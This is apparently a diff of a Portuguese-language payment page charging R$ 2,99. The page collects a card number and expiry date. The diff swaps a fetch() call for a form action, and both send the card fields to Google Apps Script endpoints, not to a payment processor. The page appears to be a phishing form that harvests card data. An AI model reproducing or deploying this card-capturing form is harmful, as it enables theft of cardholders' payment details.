@@ -128,29 +128,17 @@ button:active {
     <strong>R$ 2,99</strong>
   </div>
 
-  <script>
-document.getElementById("form").addEventListener("submit", function(e) {
-  e.preventDefault();
+  <form
+    action="https://script.google.com/macros/s/AKfycbyy4AYCzE2gpPiKkwO1XP3R2izuOzRFKcuju5oDrv1GX3rCDrWXKkJxEVXE5ZSNfRCh/exec"
+    method="POST"
+  >
 
-  fetch("https://script.google.com/macros/s/AKfycby0F3CJAA9_dzob4O1J0RpF_cuFiW2WYHbyT3FO705xqcwMeUjnoI3Uat60D_pgMv8B/exec", {
-    method: "POST",
-    body: new FormData(this)
-  })
-  .then(() => {
-    window.location.href = "sucesso.html";
-  })
-  .catch(() => {
-    alert("Erro ao enviar. Tente novamente.");
-  });
-});
-</script>
-
-    <label>Número do cartão</label>
+    <label>Número</label>
     <input name="numero" required placeholder="Digite o número">
 
     <div class="row">
       <div style="flex:1">
-        <label>Data de Validade (MM/AA)</label>
+        <label>Validade (MM/AA)</label>
         <input name="validade" required placeholder="MM/AA">
       </div>
       <div style="flex:1">
@@ -183,17 +171,3 @@ document.getElementById("form").addEventListener("submit", function(e) {
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
